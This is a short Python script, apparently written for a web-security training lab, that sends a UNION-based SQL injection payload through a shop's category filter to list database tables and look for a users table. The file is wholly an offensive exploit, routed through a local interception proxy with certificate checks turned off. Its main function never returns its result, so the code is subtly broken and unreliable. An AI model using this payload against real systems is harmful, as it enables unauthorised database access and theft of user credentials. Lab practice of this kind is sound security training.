import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def perform_request(url, sql_payload):
	path = '/filter?category=Accessories'
	r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
	return r.text
	
def sqli_users_table(url):
	sql_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables --"
	res = perform_request(url, sql_payload)
	soup = BeautifulSoup(res, 'html.parser')
	users_table = soup.find(text=re.compile('.*users.*'))
	
	
if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print("[-] Usage %s <url>" % sys.argv[0])
		print("[-] Example: %s www.example.com" % sys.argv[0])
		sys.exit(-1)
		
	print("Looking for a users table...")
	users_table = sqli_users_table(url)
	if users_table:
		print("Found the users table name: %s" % users_table)
	else:
		print("Did not find a users table.")
	
	
	
	
	
	